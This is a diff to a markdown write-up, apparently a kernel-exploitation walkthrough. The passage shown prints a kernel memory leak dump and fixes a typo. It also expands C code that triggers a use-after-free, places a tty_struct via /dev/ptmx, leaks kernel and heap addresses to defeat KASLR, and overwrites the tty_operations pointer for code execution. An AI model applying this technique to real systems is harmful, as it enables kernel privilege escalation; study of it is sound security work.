@@ -235,8 +235,7 @@ Executing this on the kernel, we get the result we're looking for: our zero'd ou
 success, returned 0
 success, returned 0
 success, returned 0
-Printing: 01  ... 15 bytes ... c0 e3 99 41 16 db 39 ff  ... 1 bytes ... 90 bd 41 16 db 39 ff  ... 1 bytes ... 51 08 92 ff ff ff ff 90 b9 b8 41 16 db 39 ff  ... 16 bytes ... 40 ac c3 41 16 db 39 ff 40 ac c3 41 16 db 39 ff 50 ac c3 41 16 db 39 ff 50 ac c3 41 16 db 39 ff  ... 16 bytes ... 70 ac c3 41 16 db 39 ff 70 ac c3 41 16 db 39 ff  ... 16 bytes ... 90 ac c3 41 16 db 39 ff 90 ac c3 41 16 db 39 ff  ... 16 bytes ... b0 ac c3 41 16 db 39 ff b0 ac c3 41 16 db 39 ff  ... 24 bytes ... d8 ac c3 41 16 db 39 ff d8 ac c3 41 16 db 39 ff  ... 16 bytes ... f8 ac c3 41 16 db 39 ff f8 ac c3 41 16 db 39 ff  ... 8 bytes ... bf  ... 8 bytes ... 03 1c 7f 15 04  ... 1 bytes ... 01  ... 1 bytes ... 11 13 1a  ... 1 bytes ... 12 0f 17 16  ... 4 bytes ... 96  ... 3 bytes ... 96  ... 46 bytes ... 70 74 6d 30  ... 60 bytes ... 01 08 01  ... 5 bytes ... 01  ... 56 bytes ... b0 c3 41 16 db 39 ff  ... 16 bytes ... f8 ad c3 41 16 db 39 ff f8 ad c3 41 16 db 39 ff  ... 8 bytes ... 10 ae c3 41 16 db 39 ff 10 ae c3 41 16 db 39 ff e0 ff ff ff 0f  ... 3 bytes ... 28 ae c3 41 16 db 39 ff 28 ae c3 41 16 db 39 ff  ... 1 bytes ... 96 40 91 ff ff ff ff  ... 1 bytes ... d0 18 80 6f 07 55 ff c0 8b be 41
- 16 db 39 ff  ... 16 bytes ... 90 59 05 41 16 db 39 ff 90 59 05 41 16 db 39 ff e0 ff ff ff 0f  ... 3 bytes ... 78 ae c3 41 16 db 39 ff 78 ae c3 41 16 db 39 ff e0 b3 40 91 ff ff ff ff  ..
+Printing: 01  ... 15 bytes ... c0 e3 99 41 16 db 39 ff  ... 1 bytes ... 90 bd 41 16 db 39 ff  ... 1 bytes ... 51 08 92 ff ff ff ff 90 b9 b8 41 16 db 39 ff  ... 16 bytes ... 40 ac c3 41 16 db 39 ff 40 ac c3 41 16 db 39 ff 50 ac c3 41 16 db 39 ff 50 ac c3 41 16 db 39 ff  ... 16 bytes ... 70 ac c3 41 16 db 39 ff 70 ac c3 41 16 db 39 ff  ... 16 bytes ... 90 ac c3 41 16 db 39 ff 90 ac c3 41 16 db 39 ff  ... 16 bytes ... b0 ac c3 41 16 db 39 ff b0 ac c3 41 16 db 39 ff  ... 24 bytes ... d8 ac c3 41 16 db 39 ff d8 ac c3 41 16 db 39 ff  ... 16 bytes ... f8 ac c3 41 16 db 39 ff f8 ac c3 41 16 db 39 ff  ... 8 bytes ... bf  ... 8 bytes ... 03 1c 7f 15 04  ... 1 bytes ... 01  ... 1 bytes ... 11 13 1a  ... 1 bytes ... 12 0f 17 16  ... 4 bytes ... 96  ... 3 bytes ... 96  ... 46 bytes ... 70 74 6d 30  ... 60 bytes ... 01 08 01  ... 5 bytes ... 01  ... 56 bytes ... b0 c3 41 16 db 39 ff  ... 16 bytes ... f8 ad c3 41 16 db 39 ff f8 ad c3 41 16 db 39 ff  ... 8 bytes ... 10 ae c3 41 16 db 39 ff 10 ae c3 41 16 db 39 ff e0 ff ff ff 0f  ... 3 bytes ... 28 ae c3 41 16 db 39 ff 28 ae c3 41 16 db 39 ff  ... 1 bytes ... 96 40 91 ff ff ff ff  ... 1 bytes ... d0 18 80 6f 07 55 ff c0 8b be 41 16 db 39 ff  ... 16 bytes ... 90 59 05 41 16 db 39 ff 90 59 05 41 16 db 39 ff e0 ff ff ff 0f  ... 3 bytes ... 78 ae c3 41 16 db 39 ff 78 ae c3 41 16 db 39 ff e0 b3 40 91 ff ff ff ff  ..
 ```
 
 ### Obtaining a kaslr bypass
@@ -265,7 +264,7 @@ So that's all good, but we can also go a bit further. Knowing that, in this run,
 .....
 ```
 
-Essentially, we get a bunch of leaks near to the address of the actual buffer. In my case, I will be using `buf+64` (the first address seen here). Since it's at an offset of `buffer_addres+0x40`, we can simply subtract `0x40` from this address in order to get a leak.
+Essentially, we get a bunch of leaks near to the address of the actual buffer. In my case, I will be using `buf+64` (the first address seen here). Since it's at an offset of `buffer_address+0x40`, we can simply subtract `0x40` from this address in order to get a leak.
 
 ## tty_operations and code execution
 
@@ -291,10 +290,17 @@ So, essentially, the idea to get some function A to execute whenever we call `io
 
 ```c
 unsigned char userland_buffer[0x400];
+
+//get UAF
+allocate_buffer();
+free_buffer();
+
+//get ptmx with the tty_struct now on the same heap address as kernel buffer
 int ptmx_fd = open("/dev/ptmx", O_RDONLY);
 
-// do the UAF and leak stuff here...
-// not present just bc i wanna save space
+//read from kernel to our userland buffer in order to get leak of kmem
+read_from_kernel(userland_buffer);
+get_kernel_and_heap_leaks();
 
 //modify the tty_struct's *op field to the location of our fake tty_operations struct on the kernel
 uint64_t* tty_ops_ptr = (uint64_t*)(buf+32);
